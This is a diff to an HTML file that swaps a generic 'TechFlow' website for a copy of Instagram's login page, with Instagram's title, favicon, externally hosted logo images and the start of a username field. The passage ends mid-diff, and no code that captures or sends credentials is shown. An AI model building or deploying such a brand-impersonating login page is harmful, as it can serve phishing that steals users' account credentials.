@@ -1,2531 +1,284 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Professional interactive website with user authentication and modern features">
-    <meta name="keywords" content="web application, user authentication, responsive design">
-    <title>TechFlow - Modern Web Solutions</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <title>Instagram</title>
+    <link rel="icon" type="image/png" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico" />
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster" />
+    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />
     <style>
-        :root {
-            --primary-color: #6366f1;
-            --primary-dark: #4f46e5;
-            --secondary-color: #8b5cf6;
-            --accent-color: #ec4899;
-            --success-color: #10b981;
-            --error-color: #ef4444;
-            --warning-color: #f59e0b;
-            --bg-color: #ffffff;
-            --bg-secondary: #f9fafb;
-            --text-color: #111827;
-            --text-secondary: #6b7280;
-            --border-color: #e5e7eb;
-            --shadow: 0 1px 3px rgba(0,0,0,0.1);
-            --shadow-lg: 0 10px 25px rgba(0,0,0,0.1);
-            --transition: all 0.3s ease;
-        }
-
-        [data-theme="dark"] {
-            --bg-color: #111827;
-            --bg-secondary: #1f2937;
-            --text-color: #f9fafb;
-            --text-secondary: #9ca3af;
-            --border-color: #374151;
-            --shadow: 0 1px 3px rgba(0,0,0,0.3);
-            --shadow-lg: 0 10px 25px rgba(0,0,0,0.3);
-        }
-
         * {
+            box-sizing: border-box;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
         }
-
         body {
-            font-family: 'Inter', sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            line-height: 1.6;
-            transition: var(--transition);
+            background: #fafafa;
+            color: #262626;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-size: 14px;
+            line-height: 18px;
         }
-
         .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
-        }
-
-        /* Navigation */
-        nav {
-            background-color: var(--bg-color);
-            box-shadow: var(--shadow);
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            z-index: 1000;
-            transition: var(--transition);
-        }
-
-        .nav-container {
             display: flex;
-            justify-content: space-between;
+            justify-content: center;
             align-items: center;
-            padding: 1rem 2rem;
-            max-width: 1400px;
-            margin: 0 auto;
-        }
-
-        .logo {
-            font-size: 1.5rem;
-            font-weight: 700;
-            color: var(--primary-color);
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-
-        .nav-links {
-            display: flex;
-            list-style: none;
-            gap: 2rem;
-            align-items: center;
-        }
-
-        .nav-links a {
-            color: var(--text-color);
-            text-decoration: none;
-            font-weight: 500;
-            transition: var(--transition);
-            position: relative;
-        }
-
-        .nav-links a:hover {
-            color: var(--primary-color);
-        }
-
-        .nav-links a::after {
-            content: '';
-            position: absolute;
-            bottom: -5px;
-            left: 0;
-            width: 0;
-            height: 2px;
-            background-color: var(--primary-color);
-            transition: var(--transition);
-        }
-
-        .nav-links a:hover::after {
+            max-width: 935px;
+            margin: 32px auto 0;
+            padding-bottom: 32px;
             width: 100%;
         }
-
-        .nav-auth {
-            display: flex;
-            gap: 1rem;
-            align-items: center;
+        .col.image {
+            flex: 0 0 454px;
+            height: 618px;
+            margin-right: 32px;
+            position: relative;
         }
-
-        .hamburger {
-            display: none;
-            flex-direction: column;
-            cursor: pointer;
-            gap: 5px;
+        #image {
+            height: 581px;
+            left: 128px;
+            position: absolute;
+            top: 27px;
+            width: 240px;
         }
-
-        .hamburger span {
-            width: 25px;
-            height: 3px;
-            background-color: var(--text-color);
-            transition: var(--transition);
+        .col.content {
+            flex-grow: 1;
+            max-width: 350px;
         }
-
-        .hamburger.active span:nth-child(1) {
-            transform: rotate(45deg) translate(8px, 8px);
+        .box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            margin-bottom: 10px;
+            padding: 10px 0;
+            text-align: center;
         }
-
-        .hamburger.active span:nth-child(2) {
-            opacity: 0;
+        .title img {
+            height: 51px;
+            margin: 22px auto 12px;
         }
-
-        .hamburger.active span:nth-child(3) {
-            transform: rotate(-45deg) translate(7px, -7px);
+        .login-form {
+            margin: 0 auto;
+            max-width: 258px;
+            width: 100%;
         }
-
-        /* Buttons */
-        .btn {
-            padding: 0.6rem 1.5rem;
+        .form-content {
+            position: relative;
+            margin-bottom: 6px;
+        }
+        input {
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            color: #262626;
+            font-size: 12px;
+            height: 36px;
+            padding: 9px 0 7px 8px;
+            width: 100%;
+        }
+        label {
+            color: #8e8e8e;
+            font-size: 12px;
+            left: 8px;
+            line-height: 36px;
+            position: absolute;
+            top: 0;
+            transition: all 0.1s ease;
+            pointer-events: none;
+        }
+        input:focus + label, input:not(:placeholder-shown) + label {
+            font-size: 10px;
+            line-height: 14px;
+            top: -6px;
+        }
+        button {
+            background: #0095f6;
             border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: 600;
-            transition: var(--transition);
-            display: inline-flex;
-            align-items: center;
-            gap: 0.5rem;
-            text-decoration: none;
-            font-size: 0.95rem;
-        }
-
-        .btn-primary {
-            background-color: var(--primary-color);
-            color: white;
-        }
-
-        .btn-primary:hover {
-            background-color: var(--primary-dark);
-            transform: translateY(-2px);
-            box-shadow: var(--shadow-lg);
-        }
-
-        .btn-secondary {
-            background-color: transparent;
-            color: var(--primary-color);
-            border: 2px solid var(--primary-color);
-        }
-
-        .btn-secondary:hover {
-            background-color: var(--primary-color);
-            color: white;
-        }
-
-        .btn-danger {
-            background-color: var(--error-color);
-            color: white;
-        }
-
-        .btn-danger:hover {
-            background-color: #dc2626;
-        }
-
-        /* Hero Section */
-        .hero {
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            background: linear-gradient(135deg, var(--primary-color) 0%, var(--secondary-color) 100%);
-            padding-top: 80px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .hero::before {
-            content: '';
-            position: absolute;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px);
-            background-size: 50px 50px;
-            animation: moveBackground 20s linear infinite;
-        }
-
-        @keyframes moveBackground {
-            0% { transform: translate(0, 0); }
-            100% { transform: translate(50px, 50px); }
-        }
-
-        .hero-content {
-            position: relative;
-            z-index: 1;
-            color: white;
-            text-align: center;
-        }
-
-        .hero h1 {
-            font-size: 3.5rem;
-            margin-bottom: 1rem;
-            animation: fadeInUp 1s ease;
-        }
-
-        .hero p {
-            font-size: 1.3rem;
-            margin-bottom: 2rem;
-            opacity: 0.95;
-            animation: fadeInUp 1s ease 0.2s backwards;
-        }
-
-        .hero-buttons {
-            display: flex;
-            gap: 1rem;
-            justify-content: center;
-            animation: fadeInUp 1s ease 0.4s backwards;
-        }
-
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        /* Features Section */
-        .features {
-            padding: 6rem 0;
-            background-color: var(--bg-secondary);
-        }
-
-        .section-title {
-            text-align: center;
-            font-size: 2.5rem;
-            margin-bottom: 3rem;
-        }
-
-        .features-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 2rem;
-        }
-
-        .feature-card {
-            background-color: var(--bg-color);
-            padding: 2rem;
-            border-radius: 12px;
-            box-shadow: var(--shadow);
-            transition: var(--transition);
-            cursor: pointer;
-        }
-
-        .feature-card:hover {
-            transform: translateY(-10px);
-            box-shadow: var(--shadow-lg);
-        }
-
-        .feature-icon {
-            width: 60px;
-            height: 60px;
-            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 1.5rem;
-            margin-bottom: 1rem;
-        }
-
-        .feature-card h3 {
-            margin-bottom: 0.5rem;
-            color: var(--text-color);
-        }
-
-        .feature-card p {
-            color: var(--text-secondary);
-        }
-
-        /* Testimonials */
-        .testimonials {
-            padding: 6rem 0;
-        }
-
-        .testimonial-slider {
-            position: relative;
-            overflow: hidden;
-        }
-
-        .testimonial-track {
-            display: flex;
-            transition: transform 0.5s ease;
-        }
-
-        .testimonial {
-            min-width: 100%;
-            padding: 2rem;
-            text-align: center;
-        }
-
-        .testimonial-content {
-            max-width: 800px;
-            margin: 0 auto;
-            background-color: var(--bg-secondary);
-            padding: 3rem;
-            border-radius: 12px;
-            box-shadow: var(--shadow);
-        }
-
-        .testimonial-text {
-            font-size: 1.2rem;
-            font-style: italic;
-            margin-bottom: 2rem;
-            color: var(--text-secondary);
-        }
-
-        .testimonial-author {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 1rem;
-        }
-
-        .author-avatar {
-            width: 60px;
-            height: 60px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 1.5rem;
-            font-weight: 600;
-        }
-
-        .slider-controls {
-            display: flex;
-            justify-content: center;
-            gap: 1rem;
-            margin-top: 2rem;
-        }
-
-        .slider-dot {
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            background-color: var(--border-color);
-            cursor: pointer;
-            transition: var(--transition);
-        }
-
-        .slider-dot.active {
-            background-color: var(--primary-color);
-            width: 30px;
-            border-radius: 6px;
-        }
-
-        /* Contact Form */
-        .contact {
-            padding: 6rem 0;
-            background-color: var(--bg-secondary);
-        }
-
-        .form-container {
-            max-width: 600px;
-            margin: 0 auto;
-            background-color: var(--bg-color);
-            padding: 3rem;
-            border-radius: 12px;
-            box-shadow: var(--shadow-lg);
-        }
-
-        .form-group {
-            margin-bottom: 1.5rem;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 0.5rem;
-            font-weight: 600;
-            color: var(--text-color);
-        }
-
-        .form-group input,
-        .form-group textarea,
-        .form-group select {
-            width: 100%;
-            padding: 0.8rem;
-            border: 2px solid var(--border-color);
-            border-radius: 8px;
-            font-family: inherit;
-            font-size: 1rem;
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            transition: var(--transition);
-        }
-
-        .form-group input:focus,
-        .form-group textarea:focus,
-        .form-group select:focus {
-            outline: none;
-            border-color: var(--primary-color);
-        }
-
-        .form-group textarea {
-            resize: vertical;
-            min-height: 120px;
-        }
-
-        .form-error {
-            color: var(--error-color);
-            font-size: 0.85rem;
-            margin-top: 0.25rem;
-            display: none;
-        }
-
-        .form-error.active {
-            display: block;
-        }
-
-        /* Modal */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: rgba(0,0,0,0.5);
-            z-index: 2000;
-            align-items: center;
-            justify-content: center;
-            animation: fadeIn 0.3s ease;
-        }
-
-        .modal.active {
-            display: flex;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        .modal-content {
-            background-color: var(--bg-color);
-            padding: 2rem;
-            border-radius: 12px;
-            max-width: 450px;
-            width: 90%;
-            max-height: 90vh;
-            overflow-y: auto;
-            position: relative;
-            animation: slideUp 0.3s ease;
-        }
-
-        @keyframes slideUp {
-            from {
-                transform: translateY(50px);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
-        }
-
-        .modal-close {
-            position: absolute;
-            top: 1rem;
-            right: 1rem;
-            font-size: 1.5rem;
-            cursor: pointer;
-            color: var(--text-secondary);
-            transition: var(--transition);
-        }
-
-        .modal-close:hover {
-            color: var(--text-color);
-        }
-
-        .modal h2 {
-            margin-bottom: 1.5rem;
-            color: var(--text-color);
-        }
-
-        .password-strength {
-            height: 4px;
-            background-color: var(--border-color);
-            border-radius: 2px;
-            margin-top: 0.5rem;
-            overflow: hidden;
-        }
-
-        .password-strength-bar {
-            height: 100%;
-            width: 0;
-            transition: var(--transition);
-        }
-
-        .password-strength-bar.weak {
-            width: 33%;
-            background-color: var(--error-color);
-        }
-
-        .password-strength-bar.medium {
-            width: 66%;
-            background-color: var(--warning-color);
-        }
-
-        .password-strength-bar.strong {
-            width: 100%;
-            background-color: var(--success-color);
-        }
-
-        .checkbox-group {
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-            margin: 1rem 0;
-        }
-
-        .checkbox-group input[type="checkbox"] {
-            width: auto;
-        }
-
-        .modal-footer {
-            text-align: center;
-            margin-top: 1rem;
-            color: var(--text-secondary);
-        }
-
-        .modal-footer a {
-            color: var(--primary-color);
-            text-decoration: none;
-        }
-
-        /* Toast Notification */
-        .toast {
-            position: fixed;
-            bottom: 2rem;
-            right: 2rem;
-            background-color: var(--bg-color);
-            padding: 1rem 1.5rem;
-            border-radius: 8px;
-            box-shadow: var(--shadow-lg);
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-            z-index: 3000;
-            transform: translateX(400px);
-            transition: transform 0.3s ease;
-        }
-
-        .toast.active {
-            transform: translateX(0);
-        }
-
-        .toast.success {
-            border-left: 4px solid var(--success-color);
-        }
-
-        .toast.error {
-            border-left: 4px solid var(--error-color);
-        }
-
-        .toast.warning {
-            border-left: 4px solid var(--warning-color);
-        }
-
-        .toast-icon {
-            font-size: 1.5rem;
-        }
-
-        .toast.success .toast-icon {
-            color: var(--success-color);
-        }
-
-        .toast.error .toast-icon {
-            color: var(--error-color);
-        }
-
-        /* Dashboard */
-        .dashboard {
-            display: none;
-            padding: 6rem 2rem 2rem;
-            min-height: 100vh;
-        }
-
-        .dashboard.active {
-            display: block;
-        }
-
-        .dashboard-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 2rem;
-        }
-
-        .dashboard-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 2rem;
-            margin-bottom: 3rem;
-        }
-
-        .stat-card {
-            background-color: var(--bg-secondary);
-            padding: 2rem;
-            border-radius: 12px;
-            box-shadow: var(--shadow);
-        }
-
-        .stat-value {
-            font-size: 2.5rem;
-            font-weight: 700;
-            color: var(--primary-color);
-            margin-bottom: 0.5rem;
-        }
-
-        .stat-label {
-            color: var(--text-secondary);
-            font-size: 0.9rem;
-        }
-
-        .dashboard-content {
-            background-color: var(--bg-secondary);
-            padding: 2rem;
-            border-radius: 12px;
-            box-shadow: var(--shadow);
-        }
-
-        .tabs {
-            display: flex;
-            gap: 1rem;
-            border-bottom: 2px solid var(--border-color);
-            margin-bottom: 2rem;
-        }
-
-        .tab {
-            padding: 1rem 1.5rem;
-            cursor: pointer;
-            border: none;
-            background: none;
-            color: var(--text-secondary);
-            font-weight: 600;
-            transition: var(--transition);
-            position: relative;
-        }
-
-        .tab.active {
-            color: var(--primary-color);
-        }
-
-        .tab.active::after {
-            content: '';
-            position: absolute;
-            bottom: -2px;
-            left: 0;
-            right: 0;
-            height: 2px;
-            background-color: var(--primary-color);
-        }
-
-        .tab-content {
-            display: none;
-        }
-
-        .tab-content.active {
-            display: block;
-        }
-
-        .content-table {
-            width: 100%;
-            border-collapse: collapse;
-        }
-
-        .content-table th,
-        .content-table td {
-            padding: 1rem;
-            text-align: left;
-            border-bottom: 1px solid var(--border-color);
-        }
-
-        .content-table th {
-            font-weight: 600;
-            color: var(--text-secondary);
-        }
-
-        .action-buttons {
-            display: flex;
-            gap: 0.5rem;
-        }
-
-        .btn-small {
-            padding: 0.4rem 0.8rem;
-            font-size: 0.85rem;
-        }
-
-        /* Profile Page */
-        .profile {
-            display: none;
-            padding: 6rem 2rem 2rem;
-            min-height: 100vh;
-        }
-
-        .profile.active {
-            display: block;
-        }
-
-        .profile-container {
-            max-width: 800px;
-            margin: 0 auto;
-        }
-
-        .profile-header {
-            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
-            padding: 3rem 2rem;
-            border-radius: 12px;
-            color: white;
-            text-align: center;
-            margin-bottom: 2rem;
-        }
-
-        .profile-avatar {
-            width: 120px;
-            height: 120px;
-            border-radius: 50%;
-            background-color: rgba(255,255,255,0.2);
-            margin: 0 auto 1rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 3rem;
-            font-weight: 700;
-        }
-
-        .profile-card {
-            background-color: var(--bg-secondary);
-            padding: 2rem;
-            border-radius: 12px;
-            box-shadow: var(--shadow);
-            margin-bottom: 2rem;
-        }
-
-        .profile-info {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 1.5rem;
-        }
-
-        .info-item {
-            display: flex;
-            flex-direction: column;
-        }
-
-        .info-label {
-            color: var(--text-secondary);
-            font-size: 0.85rem;
-            margin-bottom: 0.25rem;
-        }
-
-        .info-value {
-            color: var(--text-color);
-            font-weight: 600;
-        }
-
-        /* Settings Page */
-        .settings {
-            display: none;
-            padding: 6rem 2rem 2rem;
-            min-height: 100vh;
-        }
-
-        .settings.active {
-            display: block;
-        }
-
-        .settings-container {
-            max-width: 800px;
-            margin: 0 auto;
-        }
-
-        .setting-item {
-            background-color: var(--bg-secondary);
-            padding: 1.5rem;
-            border-radius: 12px;
-            margin-bottom: 1rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .setting-info h3 {
-            margin-bottom: 0.25rem;
-        }
-
-        .setting-info p {
-            color: var(--text-secondary);
-            font-size: 0.9rem;
-        }
-
-        .toggle-switch {
-            position: relative;
-            width: 60px;
-            height: 30px;
-        }
-
-        .toggle-switch input {
-            display: none;
-        }
-
-        .toggle-slider {
-            position: absolute;
-            cursor: pointer;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: var(--border-color);
-            transition: var(--transition);
-            border-radius: 30px;
-        }
-
-        .toggle-slider:before {
-            position: absolute;
-            content: "";
-            height: 22px;
-            width: 22px;
-            left: 4px;
-            bottom: 4px;
-            background-color: white;
-            transition: var(--transition);
-            border-radius: 50%;
-        }
-
-        input:checked + .toggle-slider {
-            background-color: var(--primary-color);
-        }
-
-        input:checked + .toggle-slider:before {
-            transform: translateX(30px);
-        }
-
-        /* Footer */
-        footer {
-            background-color: var(--bg-secondary);
-            padding: 3rem 0 1rem;
-            margin-top: 4rem;
-        }
-
-        .footer-content {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 2rem;
-            margin-bottom: 2rem;
-        }
-
-        .footer-section h3 {
-            margin-bottom: 1rem;
-            color: var(--text-color);
-        }
-
-        .footer-section ul {
-            list-style: none;
-        }
-
-        .footer-section ul li {
-            margin-bottom: 0.5rem;
-        }
-
-        .footer-section a {
-            color: var(--text-secondary);
-            text-decoration: none;
-            transition: var(--transition);
-        }
-
-        .footer-section a:hover {
-            color: var(--primary-color);
-        }
-
-        .social-links {
-            display: flex;
-            gap: 1rem;
-            margin-top: 1rem;
-        }
-
-        .social-links a {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background-color: var(--border-color);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: var(--text-color);
-            transition: var(--transition);
-        }
-
-        .social-links a:hover {
-            background-color: var(--primary-color);
-            color: white;
-            transform: translateY(-3px);
-        }
-
-        .footer-bottom {
-            text-align: center;
-            padding-top: 2rem;
-            border-top: 1px solid var(--border-color);
-            color: var(--text-secondary);
-        }
-
-        /* Loading Spinner */
-        .spinner {
-            border: 3px solid var(--border-color);
-            border-top: 3px solid var(--primary-color);
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 2rem auto;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* 404 Page */
-        .error-404 {
-            display: none;
-            min-height: 100vh;
-            padding-top: 80px;
-            text-align: center;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-        }
-
-        .error-404.active {
-            display: flex;
-        }
-
-        .error-404 h1 {
-            font-size: 8rem;
-            color: var(--primary-color);
-            margin-bottom: 1rem;
-        }
-
-        .error-404 h2 {
-            font-size: 2rem;
-            margin-bottom: 1rem;
-        }
-
-        /* Search Bar */
-        .search-container {
-            position: relative;
-            max-width: 500px;
-            margin: 2rem auto;
-        }
-
-        .search-input {
-            width: 100%;
-            padding: 1rem 3rem 1rem 1rem;
-            border: 2px solid var(--border-color);
-            border-radius: 25px;
-            font-size: 1rem;
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            transition: var(--transition);
-        }
-
-        .search-input:focus {
-            outline: none;
-            border-color: var(--primary-color);
-        }
-
-        .search-icon {
-            position: absolute;
-            right: 1rem;
-            top: 50%;
-            transform: translateY(-50%);
-            color: var(--text-secondary);
-        }
-
-        /* Accordion */
-        .accordion {
-            margin: 2rem 0;
-        }
-
-        .accordion-item {
-            background-color: var(--bg-secondary);
-            margin-bottom: 1rem;
-            border-radius: 8px;
-            overflow: hidden;
-        }
-
-        .accordion-header {
-            padding: 1.5rem;
-            cursor: pointer;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-weight: 600;
-            transition: var(--transition);
-        }
-
-        .accordion-header:hover {
-            background-color: var(--border-color);
-        }
-
-        .accordion-icon {
-            transition: var(--transition);
-        }
-
-        .accordion-item.active .accordion-icon {
-            transform: rotate(180deg);
-        }
-
-        .accordion-content {
-            max-height: 0;
-            overflow: hidden;
-            transition: max-height 0.3s ease;
-        }
-
-        .accordion-content-inner {
-            padding: 0 1.5rem 1.5rem;
-            color: var(--text-secondary);
-        }
-
-        /* Progress Bar */
-        .progress-bar {
-            height: 8px;
-            background-color: var(--border-color);
             border-radius: 4px;
-            overflow: hidden;
-            margin: 1rem 0;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+            height: 30px;
+            margin: 8px 40px;
+            width: calc(100% - 80px);
         }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
-            transition: width 0.3s ease;
+        .form-ending {
+            margin-top: 15px;
         }
-
-        /* Pagination */
-        .pagination {
-            display: flex;
-            justify-content: center;
-            gap: 0.5rem;
-            margin: 2rem 0;
+        #OR {
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+            margin: 0;
         }
-
-        .page-btn {
-            padding: 0.5rem 1rem;
-            border: 2px solid var(--border-color);
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            border-radius: 8px;
-            cursor: pointer;
-            transition: var(--transition);
+        #line {
+            background: #dbdbdb;
+            display: block;
+            height: 1px;
+            margin: -9px auto 10px;
+            width: 100%;
         }
-
-        .page-btn:hover,
-        .page-btn.active {
-            background-color: var(--primary-color);
-            color: white;
-            border-color: var(--primary-color);
+        #facebook {
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 20px;
         }
-
-        /* Responsive Design */
-        @media (max-width: 768px) {
-            .nav-links {
-                position: fixed;
-                top: 70px;
-                left: -100%;
-                flex-direction: column;
-                background-color: var(--bg-color);
-                width: 100%;
-                padding: 2rem;
-                box-shadow: var(--shadow-lg);
-                transition: left 0.3s ease;
-            }
-
-            .nav-links.active {
-                left: 0;
-            }
-
-            .hamburger {
-                display: flex;
-            }
-
-            .hero h1 {
-                font-size: 2rem;
-            }
-
-            .hero p {
-                font-size: 1rem;
-            }
-
-            .hero-buttons {
-                flex-direction: column;
-            }
-
-            .section-title {
-                font-size: 1.8rem;
-            }
-
-            .dashboard-header {
-                flex-direction: column;
-                gap: 1rem;
-            }
-
-            .error-404 h1 {
-                font-size: 4rem;
-            }
+        #facebook i {
+            margin-right: 8px;
         }
-
-        @media (max-width: 480px) {
-            .nav-container {
-                padding: 1rem;
-            }
-
-            .modal-content {
-                padding: 1.5rem;
-            }
-
-            .form-container {
-                padding: 2rem 1.5rem;
-            }
+        .form-ending a {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
         }
-
-        /* Utility Classes */
-        .hidden {
-            display: none !important;
-        }
-
-        .text-center {
+        .mini-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 10px 0;
             text-align: center;
         }
-
-        .mt-1 { margin-top: 1rem; }
-        .mt-2 { margin-top: 2rem; }
-        .mb-1 { margin-bottom: 1rem; }
-        .mb-2 { margin-bottom: 2rem; }
+        .mini-box .text {
+            font-size: 14px;
+        }
+        .mini-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .download-section {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .download-section p {
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        .download-section .images img {
+            height: 40px;
+            margin: 0 4px;
+        }
+        footer {
+            margin: 50px auto 0;
+            max-width: 935px;
+            text-align: center;
+        }
+        footer ul {
+            list-style: none;
+        }
+        footer li {
+            display: inline-block;
+            margin: 0 7px 5px;
+        }
+        footer li a {
+            color: #003569;
+            font-size: 12px;
+            text-decoration: none;
+            text-transform: uppercase;
+        }
+        .copyright {
+            color: #8e8e8e;
+            font-size: 12px;
+            margin-top: 15px;
+        }
+        @media (max-width: 875px) {
+            .col.image {
+                display: none;
+            }
+            .container {
+                justify-content: center;
+            }
+        }
     </style>
 </head>
 <body>
-    <!-- Navigation -->
-    <nav>
-        <div class="nav-container">
-            <div class="logo">
-                <i class="fas fa-bolt"></i>
-                TechFlow
-            </div>
-            <ul class="nav-links" id="navLinks">
-                <li><a href="#" data-page="home">Home</a></li>
-                <li><a href="#" data-page="about">About</a></li>
-                <li><a href="#" data-page="services">Services</a></li>
-                <li><a href="#" data-page="contact">Contact</a></li>
-            </ul>
-            <div class="nav-auth">
-                <div class="toggle-switch" id="themeToggle" title="Toggle dark mode">
-                    <input type="checkbox" id="themeCheckbox">
-                    <span class="toggle-slider"></span>
-                </div>
-                <button class="btn btn-secondary" id="loginBtn">Login</button>
-                <button class="btn btn-primary" id="signupBtn">Sign Up</button>
-                <button class="btn btn-danger hidden" id="logoutBtn">Logout</button>
-            </div>
-            <div class="hamburger" id="hamburger">
-                <span></span>
-                <span></span>
-                <span></span>
-            </div>
+    <div class="container">
+        <div class="col image">
+            <a href="#"><img src="https://i.ibb.co/Q8X79RK/image.png" alt="instagram" id="image"></a>
         </div>
-    </nav>
-
-    <!-- Main Content -->
-    <main id="mainContent">
-        <!-- Home Page -->
-        <section id="homePage" class="page active">
-            <!-- Hero Section -->
-            <section class="hero">
-                <div class="container hero-content">
-                    <h1>Welcome to TechFlow</h1>
-                    <p>Innovative solutions for modern web development</p>
-                    <div class="hero-buttons">
-                        <button class="btn btn-primary" id="getStartedBtn">
-                            Get Started <i class="fas fa-arrow-right"></i>
-                        </button>
-                        <button class="btn btn-secondary">
-                            Learn More <i class="fas fa-info-circle"></i>
-                        </button>
-                    </div>
+        <div class="col content">
+            <div class="box">
+                <div class="title">
+                    <a href="#"><img src="https://i.ibb.co/2dCLRGv/logoname.png" alt="logoname"></a>
                 </div>
-            </section>
-
-            <!-- Features Section -->
-            <section class="features">
-                <div class="container">
-                    <h2 class="section-title">Our Features</h2>
-                    <div class="features-grid">
-                        <div class="feature-card">
-                            <div class="feature-icon">
-                                <i class="fas fa-rocket"></i>
-                            </div>
-                            <h3>Fast Performance</h3>
-                            <p>Lightning-fast load times and optimized performance for the best user experience.</p>
-                        </div>
-                        <div class="feature-card">
-                            <div class="feature-icon">
-                                <i class="fas fa-shield-alt"></i>
-                            </div>
-                            <h3>Secure & Safe</h3>
-                            <p>Enterprise-grade security to protect your data and privacy at all times.</p>
-                        </div>
-                        <div class="feature-card">
-                            <div class="feature-icon">
-                                <i class="fas fa-mobile-alt"></i>
-                            </div>
-                            <h3>Responsive Design</h3>
-                            <p>Beautiful interfaces that work perfectly on all devices and screen sizes.</p>
-                        </div>
-                        <div class="feature-card">
-                            <div class="feature-icon">
-                                <i class="fas fa-users"></i>
-                            </div>
-                            <h3>Team Collaboration</h3>
-                            <p>Work together seamlessly with powerful collaboration tools and features.</p>
-                        </div>
-                        <div class="feature-card">
-                            <div class="feature-icon">
-                                <i class="fas fa-chart-line"></i>
-                            </div>
-                            <h3>Analytics Dashboard</h3>
-                            <p>Comprehensive analytics to track and improve your performance metrics.</p>
-                        </div>
-                        <div class="feature-card">
-                            <div class="feature-icon">
-                                <i class="fas fa-cog"></i>
-                            </div>
-                            <h3>Customizable</h3>
-                            <p>Flexible options to customize everything according to your needs.</p>
-                        </div>
+                <form class="login-form" id="loginForm">
+                    <div class="form-content">
+                        <input type="text" id="uname" name="uname" required placeholder=" " />
+                        <label for="uname">Phone number, username, or email</label>
                     </div>
-                </div>
-            </section>
-
-            <!-- Testimonials Section -->
-            <section class="testimonials">
-                <div class="container">
-                    <h2 class="section-title">What Our Users Say</h2>
-                    <div class="testimonial-slider">
-                        <div class="testimonial-track" id="testimonialTrack">
-                            <div class="testimonial">
-                                <div class="testimonial-content">
-                                    <p class="testimonial-text">"TechFlow has completely transformed how we work. The interface is intuitive and the features are exactly what we needed."</p>
-                                    <div class="testimonial-author">
-                                        <div class="author-avatar">JS</div>
-                                        <div>
-                                            <h4>John Smith</h4>
-                                            <p style="color: var(--text-secondary); font-size: 0.9rem;">CEO, TechCorp</p>
-                                        </div>
